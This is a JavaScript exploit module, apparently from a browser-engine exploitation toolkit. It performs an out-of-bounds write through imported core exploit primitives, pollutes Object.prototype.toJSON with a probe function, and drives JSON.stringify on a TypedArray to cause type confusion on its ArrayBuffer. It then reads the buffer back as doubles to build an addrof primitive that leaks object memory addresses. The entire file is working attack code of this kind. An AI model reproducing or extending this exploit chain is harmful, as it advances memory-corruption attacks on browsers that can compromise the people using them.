// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v22_TargetArrayBufferConfusion)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC = "OriginalHeisenbug_TypedArrayAddrof_v22_TargetArrayBufferConfusion";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v22 = null;
let object_to_leak_B_v22 = null;
let victim_typed_array_ref_v22 = null; 
let victim_buffer_ref_v22 = null; // Para checar se o this é o buffer da vítima
let probe_call_count_v22 = 0;
let last_probe_details_v22 = null; 

function toJSON_TA_Probe_TargetArrayBufferConfusion() {
    probe_call_count_v22++;
    const call_num = probe_call_count_v22;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v22_TargetArrayBufferConfusion",
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array: (this === victim_typed_array_ref_v22),
        this_is_victim_buffer: (this === victim_buffer_ref_v22 && victim_buffer_ref_v22 !== null),
        writes_on_confused_buffer_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictimArray? ${current_call_details.this_is_victim_array}. IsVictimBuffer? ${current_call_details.this_is_victim_buffer}`, "leak");

    try {
        if (call_num === 1 && current_call_details.this_is_victim_array) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim_typed_array. Returning its buffer.`, "info");
            // victim_buffer_ref_v22 já é definido externamente. A sonda apenas o retorna.
            last_probe_details_v22 = current_call_details;
            return victim_buffer_ref_v22; // Retorna o ArrayBuffer da vítima
        } else if (current_call_details.this_is_victim_buffer) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS victim_buffer_ref_v22. Current type: ${current_call_details.this_type}`, "info");
            if (current_call_details.this_type === '[object Object]') { 
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON VICTIM BUFFER! Attempting writes...`, "vuln");
                
                try {
                    if (object_to_leak_A_v22) this[0] = object_to_leak_A_v22;
                    if (object_to_leak_B_v22) this[1] = object_to_leak_B_v22;
                    current_call_details.writes_on_confused_buffer_attempted = true;
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Writes to confused victim buffer 'this[0]' and 'this[1]' attempted.`, "info");
                } catch(e_write) {
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERRO durante escritas no buffer confuso: ${e_write.message}`, "error");
                    current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `WriteToConfusedBufferErr: ${e_write.message}; `;
                }
            } else {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: victim_buffer_ref_v22 ('this') is NOT [object Object]. Type: ${current_call_details.this_type}`, "warn");
            }
            last_probe_details_v22 = current_call_details;
            return { buffer_processed_marker: call_num }; // Evitar recursão se chamado de novo no buffer
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `OuterProbeErr: ${e.name}: ${e.message}`;
    }
    
    // Para qualquer outra chamada ou se algo der errado
    if(!last_probe_details_v22 || probe_call_count_v22 > (last_probe_details_v22.call_number || 0) ) {
      last_probe_details_v22 = current_call_details;
    }
    return { generic_probe_return_v22: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_TargetArrayBufferConfusion() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TargetArrayBufferConfusion) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC} Init...`;

    probe_call_count_v22 = 0;
    victim_typed_array_ref_v22 = null; 
    victim_buffer_ref_v22 = null;
    last_probe_details_v22 = null;
    object_to_leak_A_v22 = { marker: "ObjA_TA_v22tabc", id: Date.now() }; 
    object_to_leak_B_v22 = { marker: "ObjB_TA_v22tabc", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    
    let addrof_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, msg: "Addrof A (victim_buffer[0]): Default" };
    let addrof_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, msg: "Addrof B (victim_buffer[1]): Default" };
    const fillPattern = 0.22222222222222;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        let underlying_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
        victim_typed_array_ref_v22 = new Uint8Array(underlying_ab); 
        victim_buffer_ref_v22 = underlying_ab; // Referência direta ao ArrayBuffer

        let float64_view_on_victim_buffer = new Float64Array(victim_buffer_ref_v22); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v22 (and its buffer victim_buffer_ref_v22) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TargetArrayBufferConfusion, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v22); // Inicia com o TypedArray
            logS3(`  JSON.stringify completed. Stringify Output: ${JSON.stringify(stringifyOutput)}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Details of last probe call: ${last_probe_details_v22 ? JSON.stringify(last_probe_details_v22) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnVictimBuffer = false;
            if (last_probe_details_v22 && last_probe_details_v22.this_is_victim_buffer && last_probe_details_v22.this_type === "[object Object]") {
                heisenbugOnVictimBuffer = true;
            }
            
            logS3("STEP 3: Checking victim buffer for addrof...", "warn", FNAME_CURRENT_TEST);
            const val_A = float64_view_on_victim_buffer[0];
            addrof_A.leaked_address_as_double = val_A;
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }
            logS3(`  Value read from victim_buffer[0]: ${val_A} (${temp_A_int64.toString(true)})`, "leak");

            const val_B = float64_view_on_victim_buffer[1];
            // ... (similar for B)
            addrof_B.leaked_address_as_double = val_B;
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }
            logS3(`  Value read from victim_buffer[1]: ${val_B} (${temp_B_int64.toString(true)})`, "leak");


            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC}: Addr? SUCESSO!`;
            } else if (heisenbugOnVictimBuffer) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC}: VictimBuffer TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC}: No VictimBuffer TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V22_TABC} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v22}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof victim_buffer[0]: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof victim_buffer[1]: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v22 = null; 
        victim_buffer_ref_v22 = null;
        last_probe_details_v22 = null;
        probe_call_count_v22 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: last_probe_details_v22, 
        total_probe_calls: probe_call_count_v22,
        addrof_A_attempt_result: addrof_A,
        addrof_B_attempt_result: addrof_B,
    };
}
